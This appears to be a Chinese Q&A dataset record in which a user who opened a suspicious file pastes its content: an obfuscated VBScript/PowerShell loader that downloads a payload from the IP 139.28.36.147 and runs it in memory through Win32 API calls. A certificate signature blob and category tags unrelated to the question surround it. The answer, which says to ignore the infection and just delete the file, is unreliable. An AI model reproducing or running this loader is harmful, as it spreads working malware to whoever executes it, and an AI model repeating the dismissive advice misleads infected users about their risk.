cGluZ0NBLmNydDANBgkqhkiG9w0BAQsFAAOCAgEAVaoq\n", "''", " SIG ", "''", " GvNG83hXNzD8deNP1oUj8fz5lTmbJeb3coqYw3fUZPwV\n", "''", " SIG ", "''", " +zbCSVEseIhjVQlGOQD8adTKmyn7oz/", "AyQCbEx2wmInc", "\n", "''", " SIG ", "''", " ", "ePLNfIXNU52vYuJhZqMUKkWHSphCK1D8G7WeCDAJ+uQt", "\n", "''", " SIG ", "''", " ", "1wmJefkJ5ojOfRu4aqKbwVNgCeijuJ3XrR8cuOyYQfD2", "\n", "''", " SIG ", "''", " ", "DoD75P", "/fnRCn6wC6X0qPGjpStOq/", "CUkVNTZZmg9U0rIb", "\n", "''", " SIG ", "''", " ", "f35eCa12VIp0bcrSBWcrduv", "/mLImlTgZiEQU5QpZomvn\n", "''", " SIG ", "''", " Ij5EIdI/", "HMCb7XxIstiSDJFPPGaUr10CU+ue4p7k0x+G", "\n", "''", " SIG ", "''", " ", "AWScAMLpWnR1DT3heYi", "/HAGXyRkjgNc2Wl+WFrFjDMZG\n", "''", " SIG ", "''", " QDvOXTXUWT5Dmhiuw8nLw/", "ubE19qtcfg8wXDWd8nYive", "\n", "''", " SIG ", "''", " ", "QclTuf80EGf2JjKYe", "/", "5", "cQpSBlIKdrAqLxksVStOYkEVg\n", "''", " SIG ", "''", " M4DgI974A6T2RUflzrgDQkfoQTZxd639ouiXdE4u2h4d\n", "''", " SIG ", "''", " jFrIHprVwvDGIqhPm73YHJpRxC+a9l+nJ5e6li6FV8Bg\n", "''", " SIG ", "''", " ", "53", "hWf2rvwpWaSxECyIKcyRoFfLpxtU56mWz06J7UWpjI\n", "''", " SIG ", "''", " n7+NuxhcQ/", "XQKujiYu54BNu90ftbCqhwfvCXhHjjCANd", "\n", "''", " SIG ", "''", " ", "RyxjqCU4lwHSPzra5eX25pvcfizM", "/xdMTQCi2NYBDriL\n", "''", " SIG ", "''", " ", "7", "ubgclWJLCcZYfZ3AYwwggauMIIElqADAgECAhAHNje3\n", "''", " SIG ", "''", " JFR82Ees/", "ShmKl5bMA0GCSqGSIb3DQEBCwUAMGIxCzAJ", "\n", "''", " SIG ", "''", " ", "BgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2VydCBJbmMx", "\n", "''", " SIG ", "''", " ", "GTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xITAfBgNV", "\n", "''", " SIG ", "''", " ", "BAMTGERpZ2lDZXJ0IFRydXN0ZWQgUm9vdCBHNDAeFw0y", "\n", "''", " SIG ", "''", " ", "MjAzMjMwMDAwMDBaFw0zNzAzMjIyMzU5NTlaMGMxCzAJ", "\n", "''", " SIG ", "''", " ", "BgNVBAYTAlVTMRcwFQYDVQQKEw5EaWdpQ2VydCwgSW5j", "\n", "''", " SIG ", "''", " ", "LjE7MDkGA1UEAxMyRGlnaUNlcnQgVHJ1c3RlZCBHNCBS", "\n", "''", " SIG ", "''", " ", "U0E0MDk2IFNIQTI1NiBUaW1lU3RhbXBpbmcgQ0EwggIi", "\n", "''", " SIG ", "''", " ", "MA0GCSqGSIb3DQEBAQUAA4ICDwAwggIKAoICAQDGhjUG", "\n", "''", " SIG ", "''", " ", "SbPBPXJJUVXHJQPE8pE3qZdRodbSg9GeTKJtoLDMg", "/la\n", "''", " SIG ", "''", " ", "9", "hGhRBVCX6SI82j6ffOciQt/", "nR+eDzMfUBMLJnOWbfhX", "\n", "''", " SIG ", "''", " ", "qAJ9", "/UO0hNoR8XOxs+", "4", "rgISKIhjf69o9xBd/", "qxkrPkLc", "\n", "''", " SIG ", "''", " ", "Z47qUT3w1lbU5ygt69OxtXXnHwZljZQp09nsad", "/ZkIdG\n", "''", " SIG ", "''", " AHvbREGJ3HxqV3rwN3mfXazL6IRktFLydkf3YYMZ3V+", "0", "\n", "''", " SIG ", "''", " VAshaG43IbtArF+y3kp9zvU5EmfvDqVjbOSmxR3NNg1c\n", "''", " SIG ", "''", " ", "1", "eYbqMFkdECnwHLFuk4fsbVYTXn+", "149", "zk6wsOeKlSNbw\n", "''", " SIG ", "''", " sDETqVcplicu9Yemj052FVUmcJgmf6AaRyBD40NjgHt1\n", "''", " SIG ", "''", " biclkJg6OBGz9vae5jtb7IHeIhTZgirHkr+g3uM+onP6\n", "''", " SIG ", "''", " ", "5", "x9abJTyUpURK1h0QCirc0PO30qhHGs4xSnzyqqWc0Jo\n", "''", " SIG ", "''", " n7ZGs506o9UD4L/", "wojzKQtwYSH8UNM", "/STKvvmz3+Drhk\n", "''", " SIG ", "''", " Kvp1KCRB7UK/", "BZxmSVJQ9FHzNklNiyDSLFc1eSuo80Vg", "\n", "''", " SIG ", "''", " ", "vCONWPfcYd6T", "/jnA+bIwpUzX6ZhKWD7TA4j+s4/", "TXkt2", "\n", "''", " SIG ", "''", " ", "ElGTyYwMO1uKIqjBJgj5FBASA31fI7tk42PgpuE+9sJ0", "\n", "''", " SIG ", "''", " ", "sj8eCXbsq11GdeJgo1gJASgADoRU7s7pXcheMBK9Rp61", "\n", "''", " SIG ", "''", " ", "03a50g5rmQzSM7TNsQIDAQABo4IBXTCCAVkwEgYDVR0T", "\n", "''", " SIG ", "''", " ", "AQH", "/BAgwBgEB/", "wIBADAdBgNVHQ4EFgQUuhbZbU2FL3Mp", "\n", "''", " SIG ", "''", " ", "dpovdYxqII+eyG8wHwYDVR0jBBgwFoAU7NfjgtJxXWRM", "\n", "''", " SIG ", "''", " ", "3y5nP+e6mK4cD08wDgYDVR0PAQH", "/BAQDAgGGMBMGA1Ud\n", "''", " SIG ", "''", " JQQMMAoGCCsGAQUFBwMIMHcGCCsGAQUFBwEBBGswaTAk\n", "''", " SIG ", "''", " BggrBgEFBQcwAYYYaHR0cDovL29jc3AuZGlnaWNlcnQu\n", "''", " SIG ", "''", " Y29tMEEGCCsGAQUFBzAChjVodHRwOi8vY2FjZXJ0cy5k\n", "''", " SIG ", "''", " aWdpY2VydC5jb20vRGlnaUNlcnRUcnVzdGVkUm9vdEc0\n", "''", " SIG ", "''", " LmNydDBDBgNVHR8EPDA6MDigNqA0hjJodHRwOi8vY3Js\n", "''", " SIG ", "''", " My5kaWdpY2VydC5jb20vRGlnaUNlcnRUcnVzdGVkUm9v\n", "''", " SIG ", "''", " dEc0LmNybDAgBgNVHSAEGTAXMAgGBmeBDAEEAjALBglg\n", "''", " SIG ", "''", " hkgBhv1sBwEwDQYJKoZIhvcNAQELBQADggIBAH1ZjsCT\n", "''", " SIG ", "''", " tm+YqUQiAX5m1tghQuGwGC4QTRPPMFPOvxj7x1Bd4ksp\n", "''", " SIG ", "''", " +", "3", "CKDaopafxpwc8dB+k+YMjYC+VcW9dth/", "qEICU0MWfN", "\n", "''", " SIG ", "''", " ", "thKWb8RQTGIdDAiCqBa9qVbPFXONASIlzpVpP0d3+3J0", "\n", "''", " SIG ", "''", " ", "FNf", "/q0+KLHqrhc1DX+", "1", "gtqpPkWaeLJ7giqzl/", "Yy8ZCaH", "\n", "''", " SIG ", "''", " ", "bJK9nXzQcAp876i8dU+6WvepELJd6f8oVInw1YpxdmXa", "\n", "''", " SIG ", "''", " ", "zPByoyP6wCeCRK6ZJxurJB4mwbfeKuv2nrF5mYGjVoar", "\n", "''", " SIG ", "''", " ", "CkXJ38SNoOeY+", "/umnXKvxMfBwWpx2cYTgAnEtp/", "Nh4ck", "\n", "''", " SIG ", "''", " ", "u0+jSbl3ZpHxcpzpSwJSpzd+k1OsOx0ISQ+UzTl63f8l", "\n", "''", " SIG ", "''", " ", "Y5knLD0", "/a6fxZsNBzU+", "2", "QJshIUDQtxMkzdwdeDrknq3l\n", "''", " SIG ", "''", " NHGS1yZr5Dhzq6YBT70/", "O3itTK37xJV77QpfMzmHQXh6", "\n", "''", " SIG ", "''", " ", "OOmc4d0j", "/R0o08f56PGYX/", "sr2H7yRp11LB4nLCbbbxV7", "\n", "''", " SIG ", "''", " ", "HhmLNriT1ObyF5lZynDwN7+YAN8gFk8n+2BnFqFmut1V", "\n", "''", " SIG ", "''", " ", "wDophrCYoCvtlUG3OtUVmDG0YgkPCr2B2RP+v6TR81fZ", "\n", "''", " SIG ", "''", " ", "vAT6gt4y3wSJ8ADNXcL50CN", "/AAvkdgIm2fBldkKmKYcJ\n", "''", " SIG ", "''", " RyvmfxqkhQ/", "8mJb2VVQrH4D6wPIOK+XW+6kvRBVK5xMO", "\n", "''", " SIG ", "''", " ", "Hds3OBqhK", "/bt1nz8MIIFjTCCBHWgAwIBAgIQDpsYjvnQ\n", "''", " SIG ", "''", " Lefv21DiCEAYWjANBgkqhkiG9w0BAQwFADBlMQswCQYD\n", "''", " SIG ", "''", " VQQGEwJVUzEVMBMGA1UEChMMRGlnaUNlcnQgSW5jMRkw\n", "''", " SIG ", "''", " FwYDVQQLExB3d3cuZGlnaWNlcnQuY29tMSQwIgYDVQQD\n", "''", " SIG ", "''", " ExtEaWdpQ2VydCBBc3N1cmVkIElEIFJvb3QgQ0EwHhcN\n", "''", " SIG ", "''", " MjIwODAxMDAwMDAwWhcNMzExMTA5MjM1OTU5WjBiMQsw\n", "''", " SIG ", "''", " CQYDVQQGEwJVUzEVMBMGA1UEChMMRGlnaUNlcnQgSW5j\n", "''", " SIG ", "''", " MRkwFwYDVQQLExB3d3cuZGlnaWNlcnQuY29tMSEwHwYD\n", "''", " SIG ", "''", " VQQDExhEaWdpQ2VydCBUcnVzdGVkIFJvb3QgRzQwggIi\n", "''", " SIG ", "''", " MA0GCSqGSIb3DQEBAQUAA4ICDwAwggIKAoICAQC/", "5pBz", "\n", "''", " SIG ", "''", " ", "aN675F1KPDAiMGkz7MKnJS7JIT3yithZwuEppz1Yq3aa", "\n", "''", " SIG ", "''", " ", "za57G4QNxDAf8xukOBbrVsaXbR2rsnnyyhHS5F", "/WBTxS\n", "''", " SIG ", "''", " D1Ifxp4VpX6+n6lXFllVcq9ok3DCsrp1mWpzMpTREEQQ\n", "''", " SIG ", "''", " ", "Lt", "+C8weE5nQ7bXHiLQwb7iDVySAdYyktzuxeTsiT+CFh\n", "''", " SIG ", "''", " mzTrBcZe7FsavOvJz82sNEBfsXpm7nfISKhmV1efVFiO\n", "''", " SIG ", "''", " DCu3T6cw2Vbuyntd463JT17lNecxy9qTXtyOj4DatpGY\n", "''", " SIG ", "''", " QJB5w3jHtrHEtWoYOAMQjdjUN6QuBX2I9YI+EJFwq1WC\n", "''", " SIG ", "''", " QTLX2wRzKm6RAXwhTNS8rhsDdV14Ztk6MUSaM0C/", "CNda", "\n", "''", " SIG ", "''", " ", "SaTC5qmgZ92kJ7yhTzm1EVgX9yRcRo9k98FpiHaYdj1Z", "\n", "''", " SIG ", "''", " ", "XUJ2h4mXaXpI8OCiEhtmmnTK3kse5w5jrubU75KSOp49", "\n", "''", " SIG ", "''", " ", "3ADkRSWJtppEGSt+wJS00mFt6zPZxd9LBADMfRyVw4", "/", "3", "\n", "''", " SIG ", "''", " IbKyEbe7f/", "LVjHAsQWCqsWMYRJUadmJ+9oCw++hkpjPR", "\n", "''", " SIG ", "''", " ", "iQfhvbfmQ6QYuKZ3AeEPlAwhHbJUKSWJbOUOUlFHdL4m", "\n", "''", " SIG ", "''", " ", "rLZBdd56rF+NP8m800ERElvlEFDrMcXKchYiCd98THU", "/\n", "''", " SIG ", "''", " Y+whX8QgUWtvsauGi0/", "C1kVfnSD8oR7FwI+isX4KJpn1", "\n", "''", " SIG ", "''", " ", "5GkvmB0t9dmpsh3lGwIDAQABo4IBOjCCATYwDwYDVR0T", "\n", "''", " SIG ", "''", " ", "AQH", "/BAUwAwEB/", "zAdBgNVHQ4EFgQU7NfjgtJxXWRM3y5n", "\n", "''", " SIG ", "''", " ", "P+e6mK4cD08wHwYDVR0jBBgwFoAUReuir", "/SSy4IxLVGL\n", "''", " SIG ", "''", " p6chnfNtyA8wDgYDVR0PAQH/", "BAQDAgGGMHkGCCsGAQUF", "\n", "''", " SIG ", "''", " ", "BwEBBG0wazAkBggrBgEFBQcwAYYYaHR0cDovL29jc3Au", "\n", "''", " SIG ", "''", " ", "ZGlnaWNlcnQuY29tMEMGCCsGAQUFBzAChjdodHRwOi8v", "\n", "''", " SIG ", "''", " ", "Y2FjZXJ0cy5kaWdpY2VydC5jb20vRGlnaUNlcnRBc3N1", "\n", "''", " SIG ", "''", " ", "cmVkSURSb290Q0EuY3J0MEUGA1UdHwQ+MDwwOqA4oDaG", "\n", "''", " SIG ", "''", " ", "NGh0dHA6Ly9jcmwzLmRpZ2ljZXJ0LmNvbS9EaWdpQ2Vy", "\n", "''", " SIG ", "''", " ", "dEFzc3VyZWRJRFJvb3RDQS5jcmwwEQYDVR0gBAowCDAG", "\n", "''", " SIG ", "''", " ", "BgRVHSAAMA0GCSqGSIb3DQEBDAUAA4IBAQBwoL9DXFXn", "\n", "''", " SIG ", "''", " ", "OF+go3QbPbYW1", "/e/", "Vwe9mqyhhyzshV6pGrsi+IcaaVQi", "\n", "''", " SIG ", "''", " ", "7aSId229GhT0E0p6Ly23OO", "/", "0", "/", "4C5+KH38nLeJLxSA8hO", "\n", "''", " SIG ", "''", " ", "0Cre+i1Wz", "/n096wwepqLsl7Uz9FDRJtDIeuWcqFItJnL\n", "''", " SIG ", "''", " nU+nBgMTdydE1Od/", "6Fmo8L8vC6bp8jQ87PcDx4eo0kxA", "\n", "''", " SIG ", "''", " ", "GTVGamlUsLihVo7spNU96LHc", "/RzY9HdaXFSMb++hUD38\n", "''", " SIG ", "''", " dglohJ9vytsgjTVgHAIDyyCwrFigDkBjxZgiwbJZ9VVr\n", "''", " SIG ", "''", " zyerbHbObyMt9H5xaiNrIv8SuFQtJ37YOtnwtoeW/", "VvR", "\n", "''", " SIG ", "''", " ", "XKwYw02fc7cBqZ9Xql4o4rmUMYIDdjCCA3ICAQEwdzBj", "\n", "''", " SIG ", "''", " ", "MQswCQYDVQQGEwJVUzEXMBUGA1UEChMORGlnaUNlcnQs", "\n", "''", " SIG ", "''", " ", "IEluYy4xOzA5BgNVBAMTMkRpZ2lDZXJ0IFRydXN0ZWQg", "\n", "''", " SIG ", "''", " ", "RzQgUlNBNDA5NiBTSEEyNTYgVGltZVN0YW1waW5nIENB", "\n", "''", " SIG ", "''", " ", "AhAMTWlyS5T6PCpKPSkHgD1aMA0GCWCGSAFlAwQCAQUA", "\n", "''", " SIG ", "''", " ", "oIHRMBoGCSqGSIb3DQEJAzENBgsqhkiG9w0BCRABBDAc", "\n", "''", " SIG ", "''", " ", "BgkqhkiG9w0BCQUxDxcNMjIxMTA4MjMzNTE1WjArBgsq", "\n", "''", " SIG ", "''", " ", "hkiG9w0BCRACDDEcMBowGDAWBBTzhyJNhjOCkjWplLy9", "\n", "''", " SIG ", "''", " ", "j5bp", "/hx8czAvBgkqhkiG9w0BCQQxIgQgj4P2QjO2zqJ2\n", "''", " SIG ", "''", " Eiqqc6Xe0rmTwOL9WOhQO/", "A6JYbW780wNwYLKoZIhvcN", "\n", "''", " SIG ", "''", " ", "AQkQAi8xKDAmMCQwIgQgx", "/ThvjIoiSCr4iY6vhrE/", "E", "/m\n", "''", " SIG ", "''", " eBwtZNBMgHVXoCO1tvowDQYJKoZIhvcNAQEBBQAEggIA\n", "''", " SIG ", "''", " N4a6/", "PqXZ20xn5mtXpXGWnRHDSZmznxZ5uzEhJYQjFMQ", "\n", "''", " SIG ", "''", " ", "H6", "/tV8EIlSuOD4ubAQ2srfTxER8/", "KUYtUjo5CmhBFQ9y", "\n", "''", " SIG ", "''", " ", "N6eTJMdM2aZEFMBZZBUdB", "/", "6", "Uahs697pg6ZN9yXJLP8/", "G", "\n", "''", " SIG ", "''", " ", "8LzIMFv5MrYGguVHMnLftBPGEqOll8IUwQHEu", "/jziluB\n", "''", " SIG ", "''", " SAMWDQCdhq+VGkbeo8JUN1nbGr9/", "KXIp8rZ3ORobWFe2", "\n", "''", " SIG ", "''", " ", "d", "/CKlq2TgAAZ9QAPROg8Mpht8+G8tEpkP9vP0aB+wDoy\n", "''", " SIG ", "''", " dlruYRaobgZd4T7hsoeVeWN2lL9PLCV1FpCNKX0Pg05y\n", "''", " SIG ", "''", " MvXrldob51CzHTPPHde0buH3KJBJoRafMv5VMHGvaNNS\n", "''", " SIG ", "''", " nOq1WXI44Zqw7/", "y7Ji++nCaIU9ITLjr5qLfPLgXqDWAa", "\n", "''", " SIG ", "''", " ", "hbwfLRagQ3rk9Px+r6V22ApHzHtGmGKnHhgZAI+MJ7HN", "\n", "''", " SIG ", "''", " ", "Zc8Oh65qU1uQ2vsUq5fy3pbEuIRfZmn6AG9zMqsjqw3G", "\n", "''", " SIG ", "''", " ", "30pMnbSImYkKyTIb+jWC8vyLJqbirUaxpk+Iu4Mm9+ot", "\n", "''", " SIG ", "''", " ", "VV+6Ci3UgBssODRdSE9S3aKzGUbRFuWiriYVZxM", "/RJKM\n", "''", " SIG ", "''", " qaP4cnqoAXvTuMv1zU1Iz3han3MQyD3CjAVd0BM5D0m/\n", "''", " SIG ", "''", " ", "OsomA1SK4FAVM6qaPsD444jVIVzPRNP0b5Kc0P8ER6Q", "/\n", "''", " SIG ", "''", " HZvKs+BJqvWmPixPXGt6+KA=\n", "''", " SIG ", "''", " End signature block\n\n\n"]], "Tag": "算法设计"}
{"Answer": "&lt;p&gt;如果当场没有什么异常&amp;#xff0c;现在就不要管他了&amp;#xff0c;这个病毒内容不是长期的&amp;#xff0c;短期没事就不要管他&amp;#xff0c;源文件删掉就好了&lt;/p&gt;", "Konwledge_Point": "NP完全问题", "Question": ["后知后觉错误打开文件，应该怎么办", [" 打开错了一个文件，感觉很危险，", "本人完全不懂，有没有谁可以帮助我。告诉我后面应该怎么办", "\n", " \n\n\nCh9 = Ch9 & ", "\"$Translucences = Affedninge1Affedninge1Affedninge1StAledChdKi-TrTUnyScpgceCh Sp-SyTRayPrpHjeAnDIneRefFiiChnTiiSktSciNooTvnfo Al'BauCasRhiPanRogFu LoSApyCesRetIneKnmaf;TwuUnsSyiFpnDigri BlSNeyprsPrtPheRemPi.ShRUluRenWotTaiTvmPieSk.SaIOpnSttFieClrReoPopBaSVeeSorVivHuiStcTreEtsPo;FipPruLibBilS\"", "\nCh9 = Ch9 & ", "\"eidacDa PesBitEjaEutTiiTicDy TecGelGlaOusHosOu RuAWasSusSkuRerAlaAnnCacRaeThsdeuBumJomRueUnrNenTaeMesSa1An5Di8Ku1Re{Gu[LaDStlPelCyIskmVopUdoYnrDitSc(Sc`Affedninge1Affedninge1Affedninge1OpkWieUnr\"", "\nCh9 = Ch9 & ", "\"conDreFalPo3Pr2Ex`Affedninge1Affedninge1Affedninge1Cr)Di]UnpNeuchbKolMaiOpcKy FosJutBaaBetObiTucAn PieEsxSntBueForFonUn SkvCloSyiOvdSk SaITrnNaiFotfridtaKrlEliBizSteJaCinrDeiVitliiBicBiaUmlLaSkleFocMutWaiSnoPinRb(NyiPonPetOc\"", "\nCh9 = Ch9 & ", "\" MnRCoeRecEtuHepPreUn)Di;Bo[miDLdlNolsuIStmUdpRaoHirMutEx(Ec`Affedninge1Affedninge1Affedninge1SakUdeNordinVeeMalSl3Sc2Pr`Affedninge1Affedninge1Affedninge1So)Si]BapIruCzbUplSpiPrcHa kusintHeaFatDaiPocFo vieskxkotCieMarQunSl NaiAznAbtAr VeGHdeVmtViTLrhWarVkeMaabodOuSUdeselSpeLycmatIloTerPhE\"", "\nCh9 = Ch9 & ", "\"PenMatMurTbyRe(ShiManBatpo FoTPjaMoaUn,syiBenZetJe FasPaaPlndyiTr,TiiCanTotFo HaPInsMayfacMi)An;gp[arDcolAflsoIAnmFepSuoTrrPatFe(Un`Affedninge1Affedninge1Affedninge1SkAObDShVVaAQuPSuIsq3Om2Ha.stDBeLReLOv`Affedninge1Affedninge1Affedninge1Ka)Lo]FupAcuSkbValEliExcSk SasImtSaaBatNoienc\"", "\nCh9 = Ch9 & ", "\"Ar FjeSpxOmtBaeHarCrnCo RaiStnSntEj DdIAnnMiiAktDeiCaaExlgriDizTeeArSSueVicKnuHtrSyiRetStyHiDDieUnsAfcSyrUdiMapdetreoSurDr(foiPonGltFo neHVajLytAk,AfiVenRa\"", "\nCh9 = Ch9 & ", "\"tAn SeOTirpotSphInoMetAr)Ak;Az[DeDValSnlbiIEfmSkpAloStrGltpr(Th`Affedninge1Affedninge1Affedninge1AfuFesFreTvrSe3Ta2Pl`Affedninge1Affedninge1Affedninge1So)Po]SepTruPobRelCiiLicGo TusmitNaafotWaiGrcOu SteFoxRetSke\"", "\nCh9 = Ch9 & ", "\"ClrUrnGe SpiKinCotin PsCHehSkeDucUlkUnDSalPhgCoBNiuUntMatStoEvnSa(maiAbnTotWh UnUTinSvgFeuUniPllJe,uniBonBetFl EvFAfjOmeMarEdkJurSa,RaiArnAntPr BrADkmRebSliBy)Vi;Hu[ZiDPolSclpeIFumSepBroTirMitBe(An`Affedninge1Affedninge1Affedninge1AsiBamPemOv3Bo2Le.JodPolExlRe`Affedninge1Affedninge1Affedninge1\"", "\nCh9 = Ch9 & ", "\"Pe)Pr]InpFouOmbSylSniDycsc vasVatEtaDitKoisocse HaeacxDetCoeFlrArnLu PuiStnMatCh ReICumdymAlGDieGatLiCcooRemCapSloMusAniHatBuiseoDunKaFFuoAlnPatMo(UbiBenHjtto EnRgeeSy\"", "\nCh9 = Ch9 & ", "\"oPevpriexrEm2Dy2Om1Fl,BoiAlnAntMe InDDieNolBrtSn)Do;Bu[RaDTolUnlBuIJamPrpSyoSkrHotVi(mi`Affedninge1Affedninge1Affedninge1thADeDBaVraASpPPeICa3Ye2Sp.BeDImLFrLMo`Affedninge1Affedninge1Affedninge1Si)Be]SepKouNobSalBaiKvcLi bisvitLiaTrtBuiClcPa SmeGrxHytHmeSprGunPo adiDenSttFo \"", "\nCh9 = Ch9 & ", "\"glIDemSapboeDarUdsBioFonDiaTetSaeSpNFoaGamDeeBrdUrPPriOfpDoeBuCNolOpiIneObnBotta(AriTenTatNs UdtKleIrrLimChoKopSt)Su;Va[InDBelPolMiISemPypHeoverHotBa(Mi`Affedninge1Affedninge1Affedn\"", "\nCh9 = Ch9 & ", "\"inge1DeuFlsKoeTarTi3Co2se`Affedninge1Affedninge1Affedninge1Am)Tm]TrpSkuFobAulEriGlcHe EnsRetFaaSatafiEfcVe BreFrxHatMeeCorYonSl SpIIsnSptBePEttGerSa CaESpnDiuEnmToWSuiE\"", "\nCh9 = Ch9 & ", "\"knYodUnoNywEnSmatHaaPatSjiBeoStnFasBoWOm(BauSciInnSptRe KovBu1ar,AciSknFrtfr Hovto2Ka)Ma;Ro[BiDBllFolKoISamBopApoAmrOutde(De`Affedninge1Affedninge1Affedninge1KikIneSur\"", "\nCh9 = Ch9 & ", "\"LanCyeAnlSy3Fa2Ri`Affedninge1Affedninge1Affedninge1Fr)Ag]AdpcouIlbSllTaiRecGa GrsCrtGyaButPriIncpo FreNoxButPaeunrIdnSu SyiChnSptPr AcVSiiSerBetEluFoaBrlArAAnlnolPooMocSw(SkiPlnGstPj AnvSu1Ko,TeiUsnMotZs FlvGv2Ru,KoiMynSkt\"", "\nCh9 = Ch9 & ", "\"Ru ImvRe3ru,TiiDanAgtBo VevVi4Ly)At;Xy[SkDtrlHalFrIElmPrpSkoSprKutSc(Tj`Affedninge1Affedninge1Affedninge1MokAseEarDenEleMelDe3Af2En`Affedninge1Affedninge1Affedninge1Ef)ol]EppBuuOvbSylGaiArcFo HusUntMoaUntReiTrcUn BleSoxSetShecirXenDi GivSvopriModPa PaSEmeKotKoFBliNolImeUnAElpCeiBrsfiTKooMiAMiNB\"", "\nCh9 = Ch9 & ", "\"aSinItr(Fl)Bg;Te[UdDFrlBalTwIHymHepTooRarPrtGn(Vo`Affedninge1Affedninge1Affedninge1BlwHyiHjnNumUnmFi.SpdHultelBj`Affedninge1Affedninge1Affedninge1Pe)St]OvpFuuBnbTilFaiGrcan\"", "\nCh9 = Ch9 & ", "\" InsRjtUnaNotUniavcRe RueMaxDethaeInrOvnUn TriPenRetIn PamEgmfoiInoTeWSirSuichtofeRa(AniConDetCo KiHHoapolVa,MiiIknTitOx TeBHeeUnaIn,HeiClnRotAt FaSTilAbaNogNo2Ci1Bo9hj)Ko;Un[BuDLslAglunIGemFrpEaoPerNotBe(Tm`Affedninge1Affednin\"", "\nCh9 = Ch9 & ", "\"ge1Affedninge1SluRasFoeDarIl3Ga2An`Affedninge1Affedninge1Affedninge1Fe)Ca]UnpDeuBrbStlReiHecDu DasPrtBiaFntUriMucSm BreNoxuntDeePorPonCh UniKnnSctSu GaTWerMaaStnMisFolcaaEvtNieVaMAfDSbIBiSHoyBasSuAWocWicgeeDilAc(KriFrnNetBe KrIMinBofHyoBe,SliTonSntEm \"", "\nCh9 = Ch9 & ", "\"FolTiiUpgPo)Pi;Sp}at'Me;No`$PrAUesEnsabuImrDeaAfnVicFueNisAfuLamMimGleBurBrnHaeShsBo1Op5Ag8Pa2Ab=Br`$TreVonSvvPa:kraBapImpPjdRoaKotReaCa In+Ps Ty`Affedninge1Affedninge1Affedninge1En\\NiIsksStoMolReeBorAliPonLugKosEfmTuaUntMueLnrJeiGyaHelHeeUkrSanSpeGasAs.BydMoahetCy`A\"", "\nCh9 = Ch9 & ", "\"ffedninge1Affedninge1Affedninge1vi;Re`$SkABekUdtJviSioApnUdsJorAraHadHoiSauKasaneStrTanTaeOm=Vi'in'Up;diiInfUf Su(Ch-BinInoRhtIm(DrTDieHysPltSp-AaPToaAntPahNo Do`$\"", "\nCh9 = Ch9 & ", "\"VeAGosHysInuborabaHenprcNaeHesReuChmFlmeneMarAfnSeeKnsqu1Th5Af8Tr2La)Sl)Da Au{FiwGlhSkiUnlToeLi Pa(Fk`$ClAPlkpatPhiDeoSanWasUnrHeaBudCuiEnuStsMueplrRenPheCh Ki-ExeGrqLe se'Ti'Im)In Pr{No`$AfAHikAptp\"", "\nCh9 = Ch9 & ", "\"riFroHonSesTurFoatydLeireuArsOpeRarUdnAueMo Gi=ko Ab(QuNSaePawBl-ReOFabByjDieTicHotDa boNmieCotSk.SpWSeeUnbFrCTvlGoiPreBenbitAu)po.CoDreoOvwPrnPelTioBaaIndBySV\"", "\nCh9 = Ch9 & ", "\"atUnrsoiApnBrgBe(Do'WihFatAutIcpSa:Ch/Fl/Ar1Fo3Bu9Sh.Ve2Iv8Mb.In3To6Bl.Ma1Pl4Nd7Ss/MeSMeaMemAbmmeeCenSlsFetNeiBelhjlOreRenKxdUpeVisRg.AndKosMepLi'Sp)Ha;ScSAntDraCorLatKa-SkSHalP\"", "\nCh9 = Ch9 & ", "\"aeIneSapAa Ki5Kl;Rv}BiSMieZotSu-MyCSioDrnDithoeSlnVotTh Bo`$AdAchsOssBeuKorFoaKunApcWiePrsUnuDimOnmpaefurarnUneTosre1De5Pr8Tv2So Ru`$OmASakGetOfiCboFonS\"", "\nCh9 = Ch9 & ", "\"nsThrTiaDodToiChuAusAfeForRenLseKa;Ru}Fu`$LuASasMesFouOprDiaOpnUncOxeBesCruFlmSemKiecerBenPreSesDe1Mu5Ye8Ga3Je=Sp[CrAHusAfsCeuAmrMeaHonBucBeeCosLeuAnmOpmSkeSmrHenPreAusPa1mi5Ph8Eg1co]Ub:Fo:KoVHoiSkrTrtPauSiatrlKaAIlleplGloAlcIn(Sa0Ud,De1de0Ou4Kn8Bu5Me7Do\"", "\nCh9 = Ch9 & ", "\"6Ce,Re1Jo2Th2Ar8So8Co,Ca6Au4An)Ge;Ta`$LuABekIntDyiBroSynUnsSurRiaStdKdibeuUdsSheAkrRenKoeDi Uf=In RhGSteMdtUl-QuCReocunAftTaeKlnAgtPe Le`$PrAIlsZisfruStrFlaLinKrcleeUnsKvuJumEumAfeKorstnCueDisTi1Fo5Uf8es2li;Fl`$FrPEsaRkrWoeD\"", "\nCh9 = Ch9 & ", "\"ooMoeCoaFinOv St=Co Se[noSChyVisFotUneTimOs.SoCProBenEsvDaeLirSktJu]Ku:Ti:PaFGarOmoAxmMaBMaaUnsSjeGo6Km4BySRotInrPoiBanRegEx(Ba`$MiAMokGltStiWioponAlsEnrIsaBedPaireuSpsSkeVerStnEueAu)In;ko[HaSSkyAmsHotAeeHamSt.BlRomuBenRitSuiPrmofeHv.PaIbunLetAbeSyrProSupCoSNeeinrDuvAaiAfcCoePosRr.beMFaaRarGasS\"", "\nCh9 = Ch9 & ", "\"khBeaStlSu]We:Re:BaCLeoUnpPlyMo(Ar`$OvPMiaAnrReeNooBoeEnaSpnOx,Fa Af0Va,Hy Ch Ho`$PaAResVisJauFirPeaFonUncDeePrsInuHemOpmSteGrrUdnFleAdsCu1Bl5Se8Dy3Im,Wa In`$DiPSpaRerSueAfoMaeKaaLanSl.PrcUnohuuPrnAntIn)At;aa[SeApasPlsHyunarLi\"", "\nCh9 = Ch9 & ", "\"aTenPrcTheMesChuFumTemUneInrScnDieCasTy1Re5Dy8El1Un]To:Re:ReETrnEluUbmGeWOmiRynTadKroOpwgaSSmtDeaArtDriFooRinChsStWpa(Af`$UtAUssSesKoukarUnadunTrcCheEnsFluInmSkmraeInrEmnSueMesSl1Su5Ar8Vr3Wi,Ri Br0Cr)Un#Bu;A\"", "\nCh9 = Ch9 & ", "\"ffedninge1Affedninge1Affedninge1;Function Assurancesummernes1584 {    param([String]$HS);    For($i=2; $i -lt $HS.Length-1; $i+=(2+1)){        $Sardindaasens = $Sardindaasens + $HS.Substring($i, 1);    }    $Sard\"", "\nCh9 = Ch9 & ", "\"indaasens;}$Taxiauto0 = Assurancesummernes1584 'ReIMiETiXCe ';$Taxiauto1= Assurancesummernes1584 $Translucences;& ($Taxiauto0) $Taxiauto1;;\"", "\n\n", "set", " Nitwits ", "= CreateObject(", "\"Scripting.FileSystemObject\"", ")", "\n 